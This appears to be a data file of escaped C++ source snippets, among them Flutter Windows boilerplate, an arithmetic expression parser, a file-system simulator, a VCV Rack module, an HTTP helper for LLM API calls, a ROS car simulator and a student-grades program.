nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "/*\n * AritMix - Analisador de expressoes aritmeticas In-Fixas.\n * Prof.: Cleuton Sampaio\n * (ANSI C++ com C++ Standard Template Library)\n *\n * Vers\u00e3o atual: 1.0 - Marco 2003\n *\n * Operadores aritmeticos:\n *     \"+\" -> Soma\n *     \"-\" -> Subtracao\n *     \"*\" -> Multiplicao\n *     \":\" -> Divisao\n *     \"^\" -> Exponenciao\n *\n * Aceita parentesis\n *\n * Casos de teste (ja\ufffd calculados):\n * 1+2 = 3\n * 1--3 = ERRO!\n * ((5-3) * (2*3) -1) = 11\n * 1:(5^(3-2)+1) = 0,166666667\n * 4^(1:2) = 2\n * ((1 + 2) * (6/2)) = ERRO!\n * (1+2)^((4-2) * (1+2)) = 729\n * -3 *(-2*5)^2 = -300\n *\n * Uso: aritmix [opcoes]\n * -d = debug: imprimir calculos e pilha\n * -t = executar os testes: roda as expressoes de teste acima.\n *\n */\n\n#include <iostream>\n#include <sstream>\n#include <string>\n#include <stack>\n#include <vector>\n#include <cctype>\n#include <cmath>\n\nusing namespace std;\n\nbool debug = false;\nbool runTests = false;\n\n#define DEBUG(msg) if (debug) cout << endl << msg << endl;\n#define ERRO(msg) cout << endl << \"**** ERRO: \" << msg << endl;\n\n\n\ntypedef struct elementoStruct {\n        bool fim;\n        bool erro;\n        bool eOperando;\n        double operando;\n        bool eOperador;\n        char operador;} TElemento;\n\nstack <double> pilha;\nvector <TElemento> listaPosFixa;\nstack <char> pilhaOperadores;\n\nvoid parseArgs(int qtde, char* args[]) {\n     for (int x = 0; x < qtde; x++) {\n         string arg (args[x]);\n         if (arg == \"-d\") {\n            debug = true;\n         }\n         if (arg == \"-t\") {\n        \t runTests = true;\n         }\n     }\n}\n\nvoid posfixa ( double operando ) {\n       pilha.push(operando);\n}\n\n\nvoid posfixa ( char operador ) {\n       double op2 = pilha.top();\n       pilha.pop();\n       double op1 = pilha.top();\n       pilha.pop();\n       double resultado = 0.0;\n       stringstream ss1;\n       string msg;\n       if (operador == '+') {\n          resultado = op1 + op2;\n       }\n       else if (operador == '*') {\n               resultado = op1 * op2;\n            }\n            else if (operador == ':' || operador == '/') {\n                    resultado = op1 / op2;\n                 }\n                 else if (operador == '^') {\n                         resultado = pow(op1,op2);\n                      }\n                      else  if (operador == '-') {\n                               resultado = op1 - op2;\n                            }\n                            else if (operador == '^') {\n                            \t\tresultado = pow(op1,op2);\n                            }\n                            else {\n                                 ERRO(\"**** Operador invalido: \" + operador);\n                                 return;\n                            }\n       ss1 << \"CALCULAR: \" << operador\n                          << \"(\" << op1 << \", \" << op2\n                          << \")\" << \" = \" << resultado;\n       getline(ss1, msg);\n       DEBUG(msg);\n\n       pilha.push(resultado);\n}\n\nbool isOperador ( char pos ) {\n     bool retorno = false;\n     if (pos == '+' || pos == '-' || pos == '^' ||\n         pos == '*' || pos == ':' || pos == '/' ||\n         pos == '^' ||\n         pos == '(' || pos == ')') {\n         retorno = true;\n     }\n     return (retorno);\n}\n\nTElemento parse (string expressao, int &posicao) {\n       TElemento elem = {false, false, false, 0.0, false, 0};\n       string operando = \"\";\n\n       stringstream stream;\n       while (true) {\n             if ((unsigned) posicao >= expressao.length()) {\n                if (operando.length() > 0) {\n                   stream << operando;\n                   stream >> elem.operando;\n                   elem.eOperando = true;\n                   break;\n                }\n                elem.fim = true;\n                break;\n             }\n             if (isdigit(expressao[posicao]) || expressao[posicao] == '.') {\n                operando += expressao[posicao];\n                posicao++;\n             }\n             else if (isOperador(expressao[posicao])) {\n\n                     if (operando.length() > 0) {\n                        // retorna o operando\n                        stream << operando;\n                        stream >> elem.operando;\n                        elem.eOperando = true;\n                        break;\n                     }\n                     else {\n                          // retorna o operador\n                          elem.eOperador = true;\n                          elem.operador = expressao[posicao];\n                          posicao++;\n                          break;\n                     }\n                  }\n                  else {\n                       // \u00e9 whitespace\n                \t  if (!isspace(expressao[posicao]) ) {\n                \t\t  cout << endl << \"**** ERRO: caracter invalido na expressao: \"\n                \t\t  \t   << expressao[posicao] << \" na posicao: \" << posicao <<\n                \t\t  \t   endl << \"[[\" << expressao << \"]]\";\n\n                \t\t  elem.erro = true;\n                \t\t  break;\n                \t  }\n                \t  posicao++",
    "#include <memory>\n#include <vector>\n#include <string>\n#include <iostream>\n#include <algorithm>\n#include <sstream>\n\nclass Arquivo {\nprivate:\n    std::string nome;\n    std::string conteudo;\n\npublic:\n    Arquivo(const std::string& nome) : nome(nome), conteudo(\"\") {}\n\n    void escrever(const std::string& novoConteudo) {\n        this->conteudo = novoConteudo;\n    }\n\n    void ler() const {\n        std::cout << \"Conte\u00fado do arquivo '\" << nome << \"': \" << conteudo << std::endl;\n    }\n\n    const std::string& getNome() const {\n        return nome;\n    }\n};\n\nclass Diretorio {\nprivate:\n    std::string nome;\n    std::vector<std::shared_ptr<Arquivo>> arquivos;\n    std::vector<std::shared_ptr<Diretorio>> diretorios;\n\npublic:\n    Diretorio(const std::string& nome) : nome(nome) {}\n\n    bool adicionarArquivo(const std::string& nomeArquivo) {\n        if (encontrarArquivo(nomeArquivo)) {\n            return false;\n        }\n        arquivos.push_back(std::make_shared<Arquivo>(nomeArquivo));\n        return true;\n    }\n\n    bool removerArquivo(const std::string& nomeArquivo) {\n        auto it = std::find_if(arquivos.begin(), arquivos.end(),\n            [&nomeArquivo](const std::shared_ptr<Arquivo>& arquivo) {\n                return arquivo->getNome() == nomeArquivo;\n            });\n        if (it != arquivos.end()) {\n            arquivos.erase(it);\n            return true;\n        }\n        return false;\n    }\n\n    bool adicionarDiretorio(const std::string& nomeDiretorio) {\n        if (getDiretorio(nomeDiretorio)) {\n            return false;\n        }\n        diretorios.push_back(std::make_shared<Diretorio>(nomeDiretorio));\n        return true;\n    }\n\n    bool removerDiretorio(const std::string& nomeDiretorio) {\n        auto it = std::find_if(diretorios.begin(), diretorios.end(),\n            [&nomeDiretorio](const std::shared_ptr<Diretorio>& diretorio) {\n                return diretorio->getNome() == nomeDiretorio && diretorio->isEmpty();\n            });\n        if (it != diretorios.end()) {\n            diretorios.erase(it);\n            return true;\n        }\n        return false;\n    }\n\n    std::shared_ptr<Diretorio> getDiretorio(const std::string& nomeDiretorio) {\n        for (auto& diretorio : diretorios) {\n            if (diretorio->getNome() == nomeDiretorio) {\n                return diretorio;\n            }\n        }\n        return nullptr;\n    }\n\n    std::shared_ptr<Arquivo> encontrarArquivo(const std::string& nomeArquivo) {\n        auto it = std::find_if(arquivos.begin(), arquivos.end(),\n            [&nomeArquivo](const std::shared_ptr<Arquivo>& arquivo) {\n                return arquivo->getNome() == nomeArquivo;\n            });\n        return it != arquivos.end() ? *it : nullptr;\n    }\n\n    void escreverArquivo(const std::string& nomeArquivo, const std::string& conteudo) {\n        auto arquivo = encontrarArquivo(nomeArquivo);\n        if (arquivo) {\n            arquivo->escrever(conteudo);\n        }\n        else {\n            std::cout << \"Erro: Arquivo n\u00e3o encontrado.\\n\";\n        }\n    }\n\n    void lerArquivo(const std::string& nomeArquivo) {\n        auto arquivo = encontrarArquivo(nomeArquivo);\n        if (arquivo) {\n            arquivo->ler();\n        }\n        else {\n            std::cout << \"Erro: Arquivo n\u00e3o encontrado.\\n\";\n        }\n    }\n\n    void listarConteudo() const {\n        std::cout << \"Conte\u00fado do Diret\u00f3rio '\" << nome << \"':\" << std::endl;\n        for (const auto& arquivo : arquivos) {\n            std::cout << \"  Arquivo: \" << arquivo->getNome() << std::endl;\n        }\n        for (const auto& diretorio : diretorios) {\n            std::cout << \"  Diret\u00f3rio: \" << diretorio->getNome() << std::endl;\n        }\n    }\n\n    const std::string& getNome() const {\n        return nome;\n    }\n\n    bool isEmpty() const {\n        return arquivos.empty() && diretorios.empty();\n    }\n};\n\nint main() {\n    std::shared_ptr<Diretorio> root = std::make_shared<Diretorio>(\"root\");\n    std::shared_ptr<Diretorio> currentDir = root;\n    std::string linha, comando, nome, conteudo;\n\n    std::cout << \"Simulador de Sistema de Arquivos iniciado. Digite 'help' para ajuda.\\n\";\n\n    while (true) {\n        std::cout << currentDir->getNome() << \"> \";\n        std::getline(std::cin, linha);\n        std::istringstream iss(linha);\n        iss >> comando;\n\n        if (comando == \"create_file\") {\n            iss >> nome;\n            if (!currentDir->adicionarArquivo(nome)) {\n                std::cout << \"Erro: Arquivo j\u00e1 existe.\\n\";\n            }\n        }\n        else if (comando == \"write_file\") {\n            iss >> nome;\n            iss.ignore(std::numeric_limits<std::streamsize>::max(), '\\n');\n            std::getline(std::cin, conteudo);  \n            currentDir->escreverArquivo(nome, conteudo);\n        }\n        else if (comando == \"read_file\") {\n            iss >> nome;\n            currentDir->lerArquivo(nome);\n        }\n        else if (comando == \"delete_file\") {\n            iss >> nome;\n            if (!currentDir->removerArquivo(nome)) {\n",
    "#include \"plugin.hpp\"\n#include \"sanguinecomponents.hpp\"\n#include \"pcg_variants.h\"\n\nstruct DollyX : Module {\n\n\tenum ParamIds {\n\t\tPARAM_CHANNELS1,\n\t\tPARAM_CHANNELS2,\n\t\tPARAMS_COUNT\n\t};\n\n\tenum InputIds {\n\t\tINPUT_MONO_IN1,\n\t\tINPUT_MONO_IN2,\n\t\tINPUT_CHANNELS1_CV,\n\t\tINPUT_CHANNELS2_CV,\n\t\tINPUTS_COUNT\n\t};\n\n\tenum OutputIds {\n\t\tOUTPUT_POLYOUT_1,\n\t\tOUTPUT_POLYOUT_2,\n\t\tOUTPUTS_COUNT\n\t};\n\n\tstatic const int kSUBMODULES = 2;\n\tstatic const int kDEFAULT_CLONES = 16;\n\n\tint cloneCounts[kSUBMODULES];\n\n\tbool bCvConnected[kSUBMODULES];\n\tbool bInputConnected[kSUBMODULES];\n\tbool bOutputConnected[kSUBMODULES];\n\n\tdsp::ClockDivider clockDivider;\n\n\tDollyX() {\n\t\tconfig(PARAMS_COUNT, INPUTS_COUNT, OUTPUTS_COUNT, 0);\n\n\t\tconfigParam(PARAM_CHANNELS1, 1.0f, 16.0f, 16.0f, \"Clone count 1\", \"\", 0.0f, 1.0f, 0.0f);\n\t\tparamQuantities[PARAM_CHANNELS1]->snapEnabled = true;\n\n\t\tconfigParam(PARAM_CHANNELS2, 1.0f, 16.0f, 16.0f, \"Clone count 2\", \"\", 0.0f, 1.0f, 0.0f);\n\t\tparamQuantities[PARAM_CHANNELS2]->snapEnabled = true;\n\n\t\tconfigOutput(OUTPUT_POLYOUT_1, \"Cloned 1\");\n\t\tconfigOutput(OUTPUT_POLYOUT_2, \"Cloned 2\");\n\n\t\tconfigInput(INPUT_MONO_IN1, \"Mono 1\");\n\t\tconfigInput(INPUT_MONO_IN2, \"Mono 2\");\n\t\tconfigInput(INPUT_CHANNELS1_CV, \"Channels CV 1\");\n\t\tconfigInput(INPUT_CHANNELS2_CV, \"Channels CV 2\");\t\t\n\n\t\tclockDivider.setDivision(64);\n\t\tonReset();\n\t};\n\n\tvoid process(const ProcessArgs& args) override {\n\t\tif (clockDivider.process()) {\n\t\t\tcheckConnections();\n\t\t\tupdateCloneCounts();\n\t\t}\n\n\t\tfor (int i = 0; i < kSUBMODULES; i++) {\n\t\t\tif (bOutputConnected[i] && bInputConnected[i]) {\n\t\t\t\tfor (int j = 0; j < cloneCounts[i]; j++) {\n\t\t\t\t\toutputs[OUTPUT_POLYOUT_1 + i].setVoltage(inputs[INPUT_MONO_IN1 + i].getVoltage(), j);\n\t\t\t\t}\n\t\t\t}\n\t\t\telse\n\t\t\t\toutputs[OUTPUT_POLYOUT_1 + i].setChannels(0);\n\t\t}\n\t}\n\n\tint getChannelCloneCount(int channel) {\n\t\tif (bCvConnected[channel]) {\n\t\t\tfloat inputValue = math::clamp(inputs[INPUT_CHANNELS1_CV + channel].getVoltage(), 0.f, 10.f);\n\t\t\tint steps = (int)rescale(inputValue, 0.f, 10.f, 1.f, 16.f);\n\t\t\treturn steps;\n\t\t}\n\t\telse {\n\t\t\treturn std::floor(params[PARAM_CHANNELS1 + channel].getValue());\n\t\t}\n\t}\n\n\tvoid updateCloneCounts() {\n\t\tfor (int i = 0; i < kSUBMODULES; i++) {\n\t\t\tcloneCounts[i] = getChannelCloneCount(i);\n\t\t\toutputs[OUTPUT_POLYOUT_1 + i].setChannels(cloneCounts[i]);\n\t\t}\n\t}\n\n\tvoid onReset() override {\n\t\tfor (int i = 0; i < kSUBMODULES; i++) {\n\t\t\tcloneCounts[i] = kDEFAULT_CLONES;\n\t\t}\n\t}\n\n\tvoid checkConnections() {\n\t\tfor (int i = 0; i < kSUBMODULES; i++) {\n\t\t\tbCvConnected[i] = inputs[INPUT_CHANNELS1_CV + i].isConnected();\n\t\t\tbInputConnected[i] = inputs[INPUT_MONO_IN1 + i].isConnected();\n\t\t\tbOutputConnected[i] = outputs[OUTPUT_POLYOUT_1 + i].isConnected();\n\t\t}\n\t}\n};\n\nstruct DollyXWidget : ModuleWidget {\n\tDollyXWidget(DollyX* module) {\n\t\tsetModule(module);\n\t\tsetPanel(Svg::load(asset::plugin(pluginInstance, \"res/dolly-x.svg\")));\n\n\t\taddChild(createWidget<ScrewBlack>(Vec(RACK_GRID_WIDTH, 0)));\n\t\taddChild(createWidget<ScrewBlack>(Vec(box.size.x - 2 * RACK_GRID_WIDTH, 0)));\n\t\taddChild(createWidget<ScrewBlack>(Vec(RACK_GRID_WIDTH, RACK_GRID_HEIGHT - RACK_GRID_WIDTH)));\n\t\taddChild(createWidget<ScrewBlack>(Vec(box.size.x - 2 * RACK_GRID_WIDTH, RACK_GRID_HEIGHT - RACK_GRID_WIDTH)));\n\n\t\taddParam(createParamCentered<BefacoTinyKnobRed>(mm2px(Vec(29.945, 21.843)), module, DollyX::PARAM_CHANNELS1));\n\t\taddParam(createParamCentered<BefacoTinyKnobRed>(mm2px(Vec(29.945, 76.514)), module, DollyX::PARAM_CHANNELS2));\n\n\t\taddInput(createInputCentered<BananutGreen>(mm2px(Vec(9.871, 56.666)), module, DollyX::INPUT_MONO_IN1));\n\t\taddInput(createInputCentered<BananutGreen>(mm2px(Vec(9.871, 111.337)), module, DollyX::INPUT_MONO_IN2));\n\n\t\taddInput(createInputCentered<BananutBlack>(mm2px(Vec(29.945, 36.856)), module, DollyX::INPUT_CHANNELS1_CV));\n\t\taddInput(createInputCentered<BananutBlack>(mm2px(Vec(29.945, 91.526)), module, DollyX::INPUT_CHANNELS2_CV));\n\n\t\taddOutput(createOutputCentered<BananutRed>(mm2px(Vec(30.769, 56.666)), module, DollyX::OUTPUT_POLYOUT_1));\n\t\taddOutput(createOutputCentered<BananutRed>(mm2px(Vec(30.769, 111.337)), module, DollyX::OUTPUT_POLYOUT_2));\n\n\t\tFramebufferWidget* dollyFrameBuffer = new FramebufferWidget();\n\t\taddChild(dollyFrameBuffer);\n\n\t\tSanguineLedNumberDisplay* displayCloner1 = new SanguineLedNumberDisplay(2);\n\t\tdisplayCloner1->box.pos = mm2px(Vec(6.475, 17.493));\n\t\tdisplayCloner1->module = module;\n\t\tdollyFrameBuffer->addChild(displayCloner1);\n\n\t\tif (module)\n\t\t\tdisplayCloner1->values.numberValue = (&module->cloneCounts[0]);\n\n\t\tSanguineLedNumberDisplay* displayCloner2 = new SanguineLedNumberDisplay(2);\n\t\tdisplayCloner2->box.pos = mm2px(Vec(6.475, 72.164));\n\t\tdisplayCloner2->module = module;\n\t\tdollyFrameBuffer->addChild(displayCloner2);\n\n\t\tif (module)\n\t\t\tdisplayCloner2->values.numberValue = (&module->cloneCounts[1]);\n\n\t\tSanguineShapedLight* amalgamLight1 = new SanguineShapedLight();\n\t\tamalgamLight1->box.pos = mm2px(Vec(7.337, 33.237));\n\t\tamalgamLight1->wrap();\n\t\tamalgamLight1->module = module;\n\t\tamalgamLight1->setSvg(Svg::load(asset::",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"login_sign_up_page\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "//\n//  CurlHelper.cpp\n//  AIBookEngine\n//\n//  Created by Armando Meabe on 07/05/2024.\n//\n\n#include \"CurlHelper.hpp\"\n#include <iostream>\n#include <sstream>\n\nusing namespace std;\n\n// Constructor\nCurlHelper::CurlHelper() {\n    // Inicializaci\u00f3n de CURL podr\u00eda ir aqu\u00ed si es necesaria\n}\n\n// Destructor\nCurlHelper::~CurlHelper() {\n    // Limpieza de CURL podr\u00eda ir aqu\u00ed si es necesaria\n}\n\nsize_t CurlHelper::writeCallback(void* contents, size_t size, size_t nmemb, void* userp) {\n    size_t realSize = size * nmemb;\n    string temp(static_cast<const char*>(contents), realSize);\n    json jFragment;\n    try {\n        // Intenta analizar los datos recibidos como JSON.\n        jFragment = json::parse(temp);\n        // Si el fragmento tiene la clave \"response\", concatena su contenido.\n        if (jFragment.contains(\"response\")) {\n            string response = jFragment[\"response\"].get<string>();\n            cout << response; // Imprime cada fragmento de la respuesta conforme llega.\n            // Acumula solo el fragmento de la respuesta en el string userp.\n            ((std::string*)userp)->append(response);\n        }\n    } catch (json::parse_error& e) {\n        // Si hay un error al analizar el JSON, imprime un mensaje de error.\n        cerr << \"JSON parse error: \" << e.what() << endl;\n    }\n    return realSize;\n}\n\nsize_t CurlHelper::writeCallbackNoStream(void* contents, size_t size, size_t nmemb, void* userp) {\n    size_t realSize = size * nmemb;\n    // Acumula la respuesta completa en el string userp.\n    ((std::string*)userp)->append(static_cast<const char*>(contents), realSize);\n    return realSize;\n}\n\n// Configura las opciones de CURL para realizar la solicitud HTTP POST y devuelve la respuesta del servidor.\nstring CurlHelper::setupCurl(const string& jsonBody, const string& endpoint, bool stream) {\n    CURL* curl = curl_easy_init(); // Inicializa una sesi\u00f3n CURL.\n    if (!curl) {\n        cerr << \"Failed to initialize CURL\" << endl;\n        return \"\"; // Devuelve una cadena vac\u00eda si CURL no se pudo inicializar.\n    }\n    \n    struct curl_slist* headers = nullptr;\n    string response; // Aqu\u00ed almacenaremos la respuesta del servidor.\n    \n    headers = curl_slist_append(headers, \"Content-Type: application/json\");\n    curl_easy_setopt(curl, CURLOPT_URL, endpoint.c_str());\n    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);\n    curl_easy_setopt(curl, CURLOPT_POST, 1L);\n    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, jsonBody.c_str());\n\n    if (stream)\n    {\n        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, CurlHelper::writeCallback);\n    }\n    else\n    {\n        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, CurlHelper::writeCallbackNoStream);\n    }\n    \n    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response); // Almacenamos la respuesta aqu\u00ed.\n    \n    // Realiza la solicitud HTTP POST y maneja errores.\n    CURLcode res = curl_easy_perform(curl);\n    if (res != CURLE_OK) {\n        cerr << \"Error in POST request: \" << curl_easy_strerror(res) << endl;\n    }\n    \n    // Limpia los encabezados HTTP y la sesi\u00f3n CURL para evitar fugas de memoria.\n    curl_slist_free_all(headers);\n    curl_easy_cleanup(curl); // Limpia la sesi\u00f3n CURL.\n    \n    return response; // Devolvemos la respuesta del servidor.\n}\n\n// Crea el cuerpo de la solicitud JSON para enviar a la API.\nstring CurlHelper::createChatJsonBody(const string& model, const string& prompt) {\n    json j;\n    j[\"model\"] = model;\n    j[\"prompt\"] = prompt;\n    j[\"stream\"] = true;\n    j[\"options\"][\"temperature\"] = 0.1;\n    // Serializa el objeto JSON a una cadena de texto.\n    return j.dump();\n}\n\n// Crea el cuerpo de la solicitud JSON para enviar a la API. (Embeddings models only!!!)\nstring CurlHelper::createEmbeddingJsonBody(const string& model, const string& prompt) {\n    json j;\n    j[\"model\"] = model;\n    j[\"prompt\"] = prompt;\n    return j.dump();\n}\n",
    "#include <cmath>\n#include <vector>\n#include <ros/ros.h>\n#include <geometry_msgs/Point.h>\n#include <geometry_msgs/Twist.h>\n#include <visualization_msgs/Marker.h>\n#include <tf2/LinearMath/Quaternion.h>\n#include <tf2/LinearMath/Matrix3x3.h>\n#include <tf2_geometry_msgs/tf2_geometry_msgs.h>\n\nusing namespace std;\n\nros::Publisher car_position_pub;\nros::Publisher rviz_car_pub;\n\nstd::pair<double, double> car_position = {0.0, 0.0};\n\nfloat car_velocity = 0.0;\nfloat car_steering_rad = 0.0;\n\ndouble deg2rad = M_PI/180;\ndouble rad2deg = 180/M_PI;\ndouble yaw_gain_deg, car_yaw_rad = 0.0;\n\nvoid Contorl_Callback(const geometry_msgs::Twist::ConstPtr &control_msg)\n{\n    car_velocity = control_msg->linear.x;\n    car_steering_rad = control_msg->angular.z;\n}\n\nvoid Rviz_car()\n{\n    visualization_msgs::Marker ego_car;\n\n    ego_car.header.frame_id = \"edu_frame\";\n    ego_car.header.stamp = ros::Time::now();\n    ego_car.ns = \"ego_car\";\n    ego_car.id = 0;\n    ego_car.type = visualization_msgs::Marker::CUBE;\n    ego_car.action = visualization_msgs::Marker::ADD;\n    ego_car.lifetime = ros::Duration(0.2);\n\n    ego_car.pose.position.x = car_position.first;\n    ego_car.pose.position.y = car_position.second;\n    ego_car.pose.position.z = 0;\n\n    tf2::Quaternion quaternion;\n\n    quaternion.setRPY(0, 0, car_yaw_rad);\n\n    ego_car.pose.orientation = tf2::toMsg(quaternion);\n\n    ego_car.scale.x = 1.04;\n    ego_car.scale.y = 0.75;\n    ego_car.scale.z = 0.1;\n\n    ego_car.color.r = 0.0;      \n    ego_car.color.g = 0.0;     \n    ego_car.color.b = 1.0;\n    \n    ego_car.color.a = 0.75;\n\n    rviz_car_pub.publish(ego_car);\n}\n\nint main(int argc, char **argv)\n{\n\tros::init(argc, argv, \"simul_car_node\");\n\tros::NodeHandle nh;\n\n    ros::Rate loop(8);\n\n    ros::Subscriber car_control_sub = nh.subscribe<geometry_msgs::Twist>(\"/control_value\", 10, &Contorl_Callback);\n\n    car_position_pub = nh.advertise<geometry_msgs::Point> (\"/car_position\", 10);\n    rviz_car_pub = nh.advertise<visualization_msgs::Marker> (\"/rviz_car_position\", 10);\n\n    ROS_INFO(\"Simulation Running...\");\n\n    geometry_msgs::Point car_pos;\n\n\twhile(ros::ok())\n    {\t\n        ros::Time ros_stamp = ros::Time::now();\n        double stamp = ros_stamp.toSec();\t\n\n        static double last_stamp = stamp;\n\n        double dt_run = stamp - last_stamp;\n\n        double car_yaw_steering_rad = car_steering_rad - car_yaw_rad;    \n    \n        double yaw_rate_rad = car_velocity/1.04 * car_yaw_steering_rad;\n        yaw_gain_deg = yaw_rate_rad*rad2deg*dt_run;\n        car_yaw_rad = car_yaw_rad + yaw_gain_deg*deg2rad;\n\n        double dist = car_velocity*dt_run;\n\n        car_position.first = car_position.first + dist*cos(car_steering_rad);\n        car_position.second = car_position.second + dist*sin(car_steering_rad);\n\n        car_pos.x = car_position.first;\n        car_pos.y = car_position.second;\n        car_pos.z = 0.0;\n\n        car_position_pub.publish(car_pos);\n        \n        Rviz_car();\n        \n        car_velocity = 0.0;\n\n        loop.sleep();\n\n        last_stamp = stamp;\n\n\t\tros::spinOnce();\n    }\n\n    return 0;\n}\n",
    "#include <iostream>\r\n#include<fstream>\r\n#include<iomanip>\r\nusing namespace std;\r\n//q3 functions\r\nvoid Input(char name[], int subject1[], int subject2[], int subject3[], const int maximum_size, const int records)\r\n{\r\n\tifstream filein(\"grades.txt\");          // Open the file for reading\r\n\tif (filein.fail())             // Check if the file opening is successful\r\n\t{\r\n\t\tcout << \"Could not open file!\";\r\n\t\tsystem(\"pause\");\r\n\t\texit(0);\r\n\t}\r\n\r\n\tint temp;\r\n\t// Read the total number of records from the file\r\n\tfilein >> temp;\r\n\r\n\tchar chr;\r\n\tfilein.get(chr);\r\n\tfor (int i = 0; i < records; i++)\r\n\t{\r\n\t\t// Read and store student names\r\n\t\tfilein.get(chr);\r\n\t\tfor (int j = 0; chr != ','; j++)\r\n\t\t{\r\n\t\t\tname[i * maximum_size + j] = chr;\r\n\t\t\tfilein.get(chr);\r\n\t\t}\r\n\r\n\t\t// Read and store Subject 1 grades\r\n\t\tfilein.get(chr);\r\n\t\twhile (chr != ',')\r\n\t\t{\r\n\t\t\tsubject1[i] = subject1[i] * 10 + (int)(chr - '0');\r\n\t\t\tfilein.get(chr);\r\n\t\t}\r\n\r\n\t\t// Read and store Subject 2 grades\r\n\t\tfilein.get(chr);\r\n\t\twhile (chr != ',')\r\n\t\t{\r\n\t\t\tsubject2[i] = subject2[i] * 10 + (int)(chr - '0');\r\n\t\t\tfilein.get(chr);\r\n\t\t}\r\n\r\n\t\t// Read and store Subject 3 grades\r\n\t\tfilein >> subject3[i];\r\n\r\n\t\tfilein.get(chr);\r\n\t}\r\n\tfilein.close();\r\n}\r\nvoid Output(char name[], int subject1[], int subject2[], int subject3[], const int maximum_size, const int records)\r\n{\r\n\tcout << left << \"RECORD  NAME           SUBJECT1  SUBJECT2  SUBJECT3\\n\";\r\n\tfor (int i = 0; i < records; i++)\r\n\t{\r\n\t\tcout << setw(8) << i + 1;\r\n\t\tfor (int j = 0; j < maximum_size; j++)\r\n\t\t\tcout << name[i * maximum_size + j];\r\n\t\tcout << setw(10) << subject1[i] << setw(10) << subject2[i] << subject3[i] << \"\\n\\n\";\r\n\t}\r\n}\r\nvoid Students_average(char name[], int subject1[], int subject2[], int subject3[], const int maximum_size, const int records)\r\n{\r\n\tcout << left << \"RECORD  NAME           AVERAGE\\n\";\r\n\tfor (int i = 0; i < records; i++)\r\n\t{\r\n\t\tcout << setw(8) << i + 1;\r\n\t\tfor (int j = 0; j < maximum_size; j++) cout << name[i * maximum_size + j];\r\n\t\tcout << fixed << setprecision(3) << showpoint << (subject1[i] + subject2[i] + subject3[i]) / 3.0 << \"\\n\\n\";\r\n\t}\r\n}\r\nvoid Subjects_average(int subject1[], int subject2[], int subject3[], const int records)\r\n{\r\n\tcout << \"Subject 1: \";\r\n\tdouble average = 0;\r\n\tfor (int i = 0; i < records; i++)average += subject1[i];\r\n\tcout << fixed << setprecision(3) << showpoint << average / records;\r\n\tcout << \"\\nSubject 2: \";\r\n\taverage = 0;\r\n\tfor (int i = 0; i < records; i++)average += subject2[i];\r\n\tcout << fixed << setprecision(3) << showpoint << average / records;\r\n\tcout << \"\\nSubject 3: \";\r\n\taverage = 0;\r\n\tfor (int i = 0; i < records; i++)average += subject3[i];\r\n\tcout << fixed << setprecision(3) << showpoint << average / records << \"\\n\\n\";\r\n}\r\n// Function to find and display student with the highest average and subject with the lowest average\r\nvoid Highest_and_lowest_average(char name[], int subject1[], int subject2[], int subject3[], const int maximum_size, const int records)\r\n{\r\n\tcout << \"Student with Highest Average:\\n\\n\";\r\n\tint highest_index = 0;\r\n\tdouble highest = -1;\r\n\tfor (int i = 0; i < records; i++)\r\n\t\tif ((subject1[i] + subject2[i] + subject3[i]) / 3.0 > highest)\r\n\t\t{\r\n\t\t\thighest = (subject1[i] + subject2[i] + subject3[i]) / 3.0;\r\n\t\t\thighest_index = i;\r\n\t\t}\r\n\tcout << left << \"RECORD  NAME           AVERAGE\\n\";\r\n\tcout << setw(8) << highest_index + 1;\r\n\tfor (int j = 0; j < maximum_size; j++)\r\n\t\tcout << name[highest_index * maximum_size + j];\r\n\tcout << fixed << setprecision(3) << showpoint << highest << \"\\n\\n\";\r\n\tcout << \"Subject with Lowest Average:\\n\\n\";\r\n\tint lowest_number = 0;\r\n\tdouble lowest = 100, tempr = 0;\r\n\tfor (int i = 0; i < records; i++)tempr = tempr + subject1[i];\r\n\tif (tempr / records < lowest) { lowest = tempr / records; lowest_number = 1; }\r\n\ttempr = 0;\r\n\tfor (int i = 0; i < records; i++)tempr = tempr + subject2[i];\r\n\tif (tempr / records < lowest) { lowest = tempr / records; lowest_number = 2; }\r\n\ttempr = 0;\r\n\tfor (int i = 0; i < records; i++)tempr = tempr + subject3[i];\r\n\tif (tempr / records < lowest) { lowest = tempr / records; lowest_number = 3; }\r\n\tcout << \"SUBJECT  AVERAGE\\n\";\r\n\tcout << setw(9) << lowest_number << fixed << setprecision(2) << showpoint << lowest << 